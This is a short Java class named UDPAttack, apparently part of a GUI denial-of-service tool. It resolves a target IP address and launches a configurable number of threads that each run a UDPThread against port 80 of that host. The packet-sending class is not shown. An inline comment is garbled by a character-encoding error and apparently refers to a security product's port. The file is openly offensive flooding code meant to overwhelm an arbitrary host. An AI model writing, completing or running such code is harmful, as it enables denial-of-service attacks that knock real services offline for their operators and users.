package Test;

import java.net.*;
public class UDPAttack
{
 public String ip;
 public UDPThread ut;
 public UDPAttack(String ip)
 {
  this.ip=ip;
 }
 public void start() throws Exception
 {

  ut=new UDPThread(InetAddress.getByName(ip),80);//3600Ϊ360��ȫ��ʿ�Ķ˿�
  for(int i=1;i<=MainAwt.threadCount;i++)
  {
   new Thread(ut).start();
  }
 }
}
